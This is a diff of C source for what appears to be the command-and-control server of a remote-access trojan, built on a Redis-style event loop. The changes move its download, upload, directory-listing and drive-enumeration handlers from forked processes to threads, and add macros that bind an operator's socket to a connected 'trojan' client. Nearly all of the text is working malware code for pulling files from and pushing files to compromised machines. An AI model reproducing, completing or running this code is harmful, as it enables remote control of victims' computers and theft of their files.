@@ -10,6 +10,40 @@
 #include <malloc.h>
 #include <pthread.h>
 
+#define linkClients(client, trojan)\
+	do{\
+	aeDeleteFileEvent(server.el, (client)->fd, AE_READABLE);\
+	aeDeleteFileEvent(server.el, (client)->fd, AE_WRITABLE);\
+	aeDeleteFileEvent(server.el, (trojan)->fd, AE_READABLE);\
+	aeDeleteFileEvent(server.el, (trojan)->fd, AE_WRITABLE);\
+	fcntl((trojan)->fd, F_SETFL, 0);                                    \
+                                                                  \
+	struct timeval tv;                                    \
+	tv.tv_sec = 1;                                                \
+	tv.tv_usec = 0;                                               \
+	setsockopt((trojan)->fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv)); \
+	}while(0);
+
+#define unlinkClients(client, trojan)\
+	do{\
+	aeCreateFileEvent(server.el, (client)->fd, AE_READABLE, readQueryFromClient, (client));\
+	aeCreateFileEvent(server.el, (client)->fd, AE_WRITABLE, sendReplyToClient, (client));\
+	aeCreateFileEvent(server.el, (trojan)->fd, AE_READABLE, readQueryFromClient, (trojan));\
+	aeCreateFileEvent(server.el, (trojan)->fd, AE_WRITABLE, sendReplyToClient, (trojan));\
+	fcntl((trojan)->fd, F_SETFL, flags);\
+	}while(0);
+
+#define generateThreadFunc(type)\
+void type##Command(client* c){\
+	pthread_t tid;\
+\
+	int ret = pthread_create(&tid, NULL, type##_thread_func, (void*) c);\
+	if(ret){\
+		addReply(c, shared.err);\
+		return;\
+	}\
+	return;\
+}
 
 #define generateCommandTimes(type, value) \
 void type##Command(client *c) {\
@@ -158,7 +192,7 @@ void getClientsCommand(client *c){
 			continue;
 		}
 		hasClient++;
-		buf[hasClient - 1] = (char*)malloc(sizeof(char) * 1024);
+		buf[hasClient - 1] = zmalloc(sizeof(char) * 1024);
 		memset(buf[hasClient - 1], 0, 1024 * sizeof(char));
 
 		struct sockaddr_in sa;
@@ -208,24 +242,22 @@ void lockCommand(client *c){
 }
 
 /* file transport*/
-void downloadCommand(client *c){
-	volatile int tfd, cfd = c->fd;
-	/* debug */
+void* download_thread_func(void* cli){
+	int tfd, cfd;
 	int count, ret;
 	packet pac;
+	client* c = (client *) cli;
 	client *cl = genericGetClient(c);
 
 	if(cl == NULL){
 		addReply(c, shared.err);
-		return;
+		return NULL;
 	}
 	/* send cmd to the trojan client */
 	tfd = cl->fd;
 	memset(&pac, 0, sizeof(pac));
-	if(c->cur_trojan)
-		sprintf(pac.data, "*2\r\n$8\r\ndownload\r\n$%d\r\n%s\r\n", (int)strlen(c->argv[1]->ptr),(char*)c->argv[1]->ptr);
-	else
-		sprintf(pac.data, "*2\r\n$8\r\ndownload\r\n$%d\r\n%s\r\n", (int)strlen(c->argv[2]->ptr),(char*)c->argv[2]->ptr);
+	sprintf(pac.data, "*2\r\n$8\r\ndownload\r\n$%d\r\n%s\r\n",
+			(int)strlen(c->argv[c->cur_trojan? 1: 2]->ptr),(char*)c->argv[c->cur_trojan? 1: 2]->ptr);
 
 	ret = write(tfd, pac.data, strlen(pac.data));
 
@@ -233,142 +265,137 @@ void downloadCommand(client *c){
 		cfd = open(c->argv[1]->ptr, O_WRONLY|O_CREAT, S_IRWXU|S_IRWXG|S_IRWXO);
 		if(cfd == -1){
 			addReplySds(c, sdsnew("-ERR CAN'T CREATE FILE"));
-			return;
+			return NULL;
 		}
 	}
 	else
 		cfd = c->fd;
 
-	if(fork()==0){
-		int flags = fcntl(tfd, F_GETFL, 0);
-		fcntl(tfd, F_SETFL, 0);
-		while(1){
-			memset(&pac, 0, sizeof(pac));
-			count = read(tfd, &pac, sizeof(pac));
+	int flags = fcntl(tfd, F_GETFL, 0);
+	fcntl(tfd, F_SETFL, 0);
+	while(1){
+		memset(&pac, 0, sizeof(pac));
+		count = read(tfd, &pac, sizeof(pac));
 
-			if(count > 0){
-				switch(pac.type){
-				case 1:
-					if(c->cur_trojan)
-						ret = write(cfd, pac.data, sizeof(pac.data));
-					else
-						ret = write(cfd, &pac, sizeof(pac));
-					if(ret < 0)
-						goto err;
-					break;
-				case 2:
-					if(c->cur_trojan)
-						ret = write(cfd, pac.data, count - 1);
-					else
-						ret = write(cfd, &pac, count);
-					close(cfd);
-					fcntl(tfd, F_SETFL, flags);
-					exit(0);
-				default:
-					goto err;
-				}
-			}
-			else{
-err:			/* error handle*/
-				pac.type = 0;
+		if(count > 0){
+			switch(pac.type){
+			case 1:
 				if(c->cur_trojan)
-					exit(0);
-				else
 					ret = write(cfd, pac.data, sizeof(pac.data));
-				fcntl(tfd, F_SETFL, flags);
+				else
+					ret = write(cfd, &pac, sizeof(pac));
+				if(ret < 0)
+					goto err;
+				break;
+			case 2:
+				if(c->cur_trojan)
+					ret = write(cfd, pac.data, count - 1);
+				else
+					ret = write(cfd, &pac, count);
 				close(cfd);
-				exit(0);
+				fcntl(tfd, F_SETFL, flags);
+				return NULL;
+			default:
+				goto err;
 			}
+		}
+		else{
+err:			/* error handle*/
+			pac.type = 0;
+			if(c->cur_trojan)
+				return NULL;
+			else
+				ret = write(cfd, pac.data, sizeof(pac.data));
+			fcntl(tfd, F_SETFL, flags);
+			close(cfd);
+			return NULL;
 		}
 	}
 
 	addReply(c, shared.ok);
-	return ;
+	return NULL;
 }
 
-void uploadCommand(client *c){
+void*  upload_thread_func(void *cli){
 	struct stat stbuf;
+	int  cfd, leftcount = 1, count;
 	packet pac;
-	int  cfd, leftcount, count;
+
+
+	client* c = (client *) cli;
 	client *cl = genericGetClient(c);
+
+	cfd = c->fd;
+	int flags = fcntl(cl->fd, F_GETFL, 0);
 
 	if(cl == NULL){
 		addReply(c, shared.err);
-		return;
+		return NULL;
 	}
-	/* send cmd to the trojan client */
 	memset(&pac, 0, sizeof(pac));
-	if(c->cur_trojan)
-		sprintf(pac.data, "*2\r\n$6\r\nupload\r\n$%d\r\n%s\r\n", (int)strlen(c->argv[1]->ptr),(char*)c->argv[1]->ptr);
-	else
-		sprintf(pac.data, "*2\r\n$6\r\nupload\r\n$%d\r\n%s\r\n", (int)strlen(c->argv[2]->ptr),(char*)c->argv[2]->ptr);
+	sprintf(pac.data, "*2\r\n$6\r\nupload\r\n$%d\r\n%s\r\n",
+		   	(int)strlen(c->argv[c->cur_trojan? 1: 2]->ptr), (char*)c->argv[c->cur_trojan? 1: 2]->ptr);
 	int ret = write(cl->fd, pac.data, strlen(pac.data));
+	if(ret < 0)
+		goto err;
 
-	if(fork() == 0){
-		if(c->cur_trojan){
-			cfd = open(c->argv[1]->ptr, O_RDONLY|O_TRUNC);
-			if(cfd == -1)
-				goto err;
-			if(fstat(cfd, &stbuf) != 0){
-				goto err;
-			}
-			leftcount = stbuf.st_size;
-		}
-		else
-			cfd = c->fd;
+	linkClients(c, cl);
 
-		int flags = fcntl(cl->fd, F_GETFL, 0);
-		fcntl(cl->fd, F_SETFL, 0);
+	if(c->cur_trojan){
+		cfd = open(c->argv[1]->ptr, O_RDONLY);
+		if(cfd == -1 || fstat(cfd, &stbuf) != 0)
+			goto err;
+		leftcount = stbuf.st_size;
+	}
+
+	if(!c->cur_trojan){
 		while(1){
 			memset(&pac, 0, sizeof(pac));
-			if(!c->cur_trojan){
-				while(1){
-					memset(&pac, 0, sizeof(pac));
-					count = read(c->fd, &pac, sizeof(pac));
-					if(count <= 0)
-						goto err;
-					switch(pac.type){
-						case 1:
-							ret = write(cl->fd, &pac, sizeof(pac));
-							break;
-						case 2:
-							ret = write(cl->fd, &pac, count);
-							exit(0);
-						default:
-							goto err;
-					}
-				}
-			}
-			count = read(cfd, &pac.data, sizeof(pac.data));
-			leftcount -= count;
-			if(count > 0){
-				if(leftcount > 0){
-					pac.type = 1;
+			count = read(c->fd, &pac, sizeof(pac));
+			if(count <= 0)
+				goto err;
+			switch(pac.type){
+				case 1:
 					ret = write(cl->fd, &pac, sizeof(pac));
-				}
-				else{
-					pac.type = 2;
-					ret = write(cl->fd, &pac, count + 1);
-					exit(0);
-				}
-			}
-			else{
-err:			/* error handle */
-				pac.type = 0;
-				ret = write(cl->fd, &pac, sizeof(pac));
-				fcntl(cl->fd, F_SETFL, flags);
-				close(cfd);
-				exit(0);
+					break;
+				case 2:
+					ret = write(cl->fd, &pac, count);
+					unlinkClients(c, cl);
+					return NULL;
+				default:
+					goto err;
 			}
 		}
 	}
+	while(1){
+		memset(&pac, 0, sizeof(pac));
+		count = read(cfd, &pac.data, sizeof(pac.data));
+		leftcount -= count;
+		if(count > 0 && leftcount > 0){
+			pac.type = 1;
+			ret = write(cl->fd, &pac, sizeof(pac));
+			if(ret < 0)
+				goto err;
+		}
+		else{
+err:		pac.type = leftcount > 0? 0: 2;
+			ret = write(cl->fd, &pac, sizeof(pac));
+			unlinkClients(c, cl);
+			c->cur_trojan? close(cfd): 0;
+			if(c->cur_trojan)
+			   	addReply(c, leftcount > 0? shared.err: shared.ok);
+			return NULL;
+		}
+	}
+	unlinkClients(c, cl);
 
 	addReply(c, shared.ok);
-	return;
+	return NULL;
 }
 
-static void* ls_thread_func(client* c){
+static void* ls_thread_func(void* cli){
 	char buff[1400];
+	client* c = (client*) cli;
 
 	client *cl = genericGetClient(c);
 
@@ -377,23 +404,13 @@ static void* ls_thread_func(client* c){
 		return NULL;
 	}
 	int flags = fcntl(cl->fd, F_GETFL);
+	linkClients(c, cl);
 
-	aeDeleteFileEvent(server.el, cl->fd, AE_WRITABLE);
-	aeDeleteFileEvent(server.el, cl->fd, AE_READABLE);
-	aeDeleteFileEvent(server.el, c->fd, AE_WRITABLE);
-	aeDeleteFileEvent(server.el, c->fd, AE_READABLE);
 	memset(buff, 0, sizeof(buff));
 	sprintf(buff, "*1\r\n$2\r\nls\r\n");
 	int ret = write(cl->fd, buff, strlen(buff));
 	if(ret < 0)
 		goto err;
-
-	fcntl(cl->fd, F_SETFL, 0);
-
-	struct timeval tv, tv_bak;
-	tv.tv_sec = 1;
-	tv.tv_usec = 0;
-	setsockopt(cl->fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
 
 	memset(buff, 0, sizeof(buff));
 	int count = read(cl->fd, buff, sizeof(buff));
@@ -414,52 +431,42 @@ static void* ls_thread_func(client* c){
 	/* error handle*/
 	else
 err:	addReply(c, shared.err);
+	unlinkClients(c, cl);
 
-	aeCreateFileEvent(server.el, cl->fd, AE_READABLE, readQueryFromClient, cl);
-	aeCreateFileEvent(server.el, cl->fd, AE_WRITABLE, sendReplyToClient, cl);
-	aeCreateFileEvent(server.el, c->fd, AE_READABLE, readQueryFromClient, c);
-	aeCreateFileEvent(server.el, c->fd, AE_WRITABLE, sendReplyToClient, c);
-	fcntl(cl->fd, F_SETFL, flags);
 	return NULL;
 }
 
-void lsCommand(client* c){
-	pthread_t tid;
 
-	int ret = pthread_create(&tid, NULL, ls_thread_func, (void*) c);
-	if(ret){
-		addReply(c, shared.err);
-		return;
-	}
-	return;
-}
-
-void getDrivesCommand(client *c){
-	char buff[1024 * 16];
+void* getDrivers_thread_func(void *cli){
+	char buff[64];
+	client* c = (client *) cli;
 	client *cl = genericGetClient(c);
 
 	if(cl == NULL){
 		addReply(c, shared.err);
-		return;
+		return NULL;
 	}
+	int flags = fcntl(cl->fd, F_GETFL);
 
+	linkClients(c, cl);
 	sprintf(buff, "*1\r\n$9\r\ngetDrives\r\n");
-	write(cl->fd, buff, strlen(buff));
+	int ret = write(cl->fd, buff, strlen(buff));
+	if(ret < 0)
+		goto err;
 
-	if(fork() == 0){
-		fcntl(cl->fd, F_SETFL, 0);
-		memset(buff, 0, sizeof(buff));
-		unsigned int count = read(cl->fd, buff, sizeof(buff));
-		if(count > 0){
-			write(c->fd, buff, strlen(buff));
-			exit(0);
-		}
-		/* error handle*/
-err:	write(c->fd, "-ERR\r\n", strlen("-ERR\r\n"));
-		exit(0);
+	memset(buff, 0, sizeof(buff));
+	int count = read(cl->fd, buff, sizeof(buff));
+	if(count > 0){
+		ret = write(c->fd, buff, strlen(buff));
+		if(ret < 0)
+			goto err;
+		unlinkClients(c, cl);
+		return NULL;
 	}
-
-	return;
+err:	/* error handle*/
+	unlinkClients(c, cl);
+	addReply(c, shared.err);
+	return NULL;
 }
 
 /*    generateComamnd using macro      */
@@ -480,3 +487,8 @@ generateCommandTimes(mkdir, 2)
 
 generateCommandTimes(up, 1)
 generateCommandTimes(back, 1)
+
+generateThreadFunc(ls)
+generateThreadFunc(download)
+generateThreadFunc(upload)
+generateThreadFunc(getDrivers)
